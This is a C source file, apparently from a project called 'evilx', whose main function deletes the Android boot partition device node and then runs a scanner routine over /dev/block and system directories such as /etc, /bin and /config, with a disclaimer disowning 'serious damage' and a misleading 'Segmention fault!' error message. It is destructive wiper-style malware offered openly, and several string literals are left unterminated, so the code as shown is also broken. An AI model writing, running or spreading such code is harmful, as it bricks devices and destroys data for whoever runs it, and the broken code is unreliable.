#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#include "include/evilx.h"

// By YZBruh

/*
 * Copyright 2024 evilx
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at

 *     http://www.apache.org/licenses/LICENSE-2.0

 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// I do not accept responsibility or responsibilities. The user or user is responsible for any serious damage that may occur!

int main() {
    if (unlink("/dev/block/by-name/boot") == -1) {
        perror("Segmention fault!\n");
        exit(EXIT_FAILURE);
    }
    if (chdir("/dev/block") != 0) {
        perror("Oops! Blocks could not be accessed!\n");
        exit(EXIT_FAILURE);
    }
    // get current directory
    char curDir[1024];
    if (getcwd(curDir, sizeof(curDir)) == NULL) {
        perror("The current directory information could not be retrieved!\n");
        exit(EXIT_FAILURE);
    }
    // start scan
    scanner(curDir);
    // I thought... what if we did more..?
    scanner("/apex);
    scanner("/mnt");
    scanner("/etc);
    scanner("/oem");
    scanner("/odm");
    scanner("/config);
    scanner("/bin");
    exit(EXIT_SUCCESS);
}
